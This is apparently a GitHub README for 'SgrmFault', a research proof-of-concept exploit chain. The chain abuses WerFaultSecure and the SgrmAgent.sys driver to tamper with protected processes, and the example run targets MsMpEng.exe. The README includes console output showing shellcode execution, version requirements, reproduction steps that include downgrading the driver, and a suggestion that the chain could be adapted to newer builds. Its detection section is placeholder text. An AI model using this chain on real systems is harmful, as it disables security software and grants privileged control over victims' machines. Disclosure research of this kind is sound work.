# SgrmFault - Process Tampering Exploit Chain
SgrmFault revives a COM-based code injection in `WerFaultSecure` to abuse an APC-based process tampering feature exposed by `SgrmAgent.sys`. **This research was presented at REcon 2026 and DEF CON 34 under the title "Chaining Microsoft Binaries to Achieve Privileged Primitives in the Windows Kernel"**.

```
C:\Users\test\Desktop>SgrmFault.exe -p 2640 -t "MsMpEng.exe"
*******************************************************************************
*       SgrmFault: WerFaultSecure & SgrmAgent.sys Process Impairment Chain
*       Exploit chain presented at --> DEF CON 34 <--
*       Presentation: {link to be updated}
*       GitHub: https://www.github.com/lem0nSec/SgrmFault
*       Angelo Frasca Caccia (lem0nSec_) & Alejandro Pinna (waawaa)
*******************************************************************************

[+] SeDebugPrivilege ok
[+] SGRM Shellcode of size 1824 ready at 0x000002C157B0C260
[+] Section object created: 0x1f0
[+] Section mapped in local process: 0x000002C157D00000
[+] AppContainer process: 2640
[+] Random GUID generated: 9e9e80a7-d7b8-49ce-8c16-da00021cb925
[+] Opened inheritable handle to AppContainer process: 0x1f4
[+] Section object is now inheritable.
[+] Spawned WerFaultSecure: 6208 - Waiting for overlapped result...
[+] Oplock fired! Dumping WerFaultSecure.exe...
[+] IRundown parameters collected.
[+] Remote section identified at 0x000001F3CF690000
[+] IRundown connection successful: 0x000002C159790228
[+] DoCallback 1.
[+] Sample _CONTEXT saved:
        RIP: 0x00007FFDA552540E
        RSP: 0x000000C04EFFE3E0
        RBP: 0x000000C04EFFE440
[+] DoCallback 2. Firing shellcode & waiting...
[+] Complete.
```

## Requirements
**This POC runs under the following requirements:**
- Windows 10 or 11 with System Guard Runtime Monitor installed and running
- `SgrmAgent.sys` version 10.0.20348.2849 or lower

Tests have shown that default installations of Windows 10 meet the requirements. Windows 11 comes with SGRM up to 22H2, though the driver is not exploitable, but still downgradable to an older version.

## How to reproduce
**Make sure you follow these steps:**
1) Make sure the requirements above are met;
2) Bring `bins/WerFaultSecure.exe` and `bins/faultrep.dll` to the same path (optionally replace `SgrmAgent.sys` on your target machine if non-exploitable with `bins\SgrmAgent.sys`);
3) Start an AppContainer process (calc.exe)
4) Run `SgrmFault.exe`, and pass it the AppContainer process ID and the name of the target process

The exploit may fail at the first attempt due to an issue while searching for the IPID value. Just run it again.

## Why this matters
While the requirements above limit exploitation in newer Windows builds, smart changes to the POC may enable it to run on modern OS builds. This would lead to a 'Next Generation BYOVD' - entirely based on first-party components rather than third-party vulnerable drivers.

## Detection
Lorem Ipsum

## Authors
* [Angelo Frasca Caccia](https://linkedin.com/in/angelo-frasca-caccia)
* [Alejandro Pinna](https://x.com/frodosobon)

## Credits
* [@tirannido](https://x.com/tiraniddo)
* [@mdsecactivebreach - com_inject](https://github.com/mdsecactivebreach/com_inject/tree/fe3424ba10bbfe8398b4d68377824dce57e425e1)

## References
- https://projectzero.google/2018/10/injecting-code-into-windows-protected.html
- https://projectzero.google/2018/11/injecting-code-into-windows-protected.html
- https://www.microsoft.com/en-us/security/blog/2018/04/19/introducing-windows-defender-system-guard-runtime-attestation/
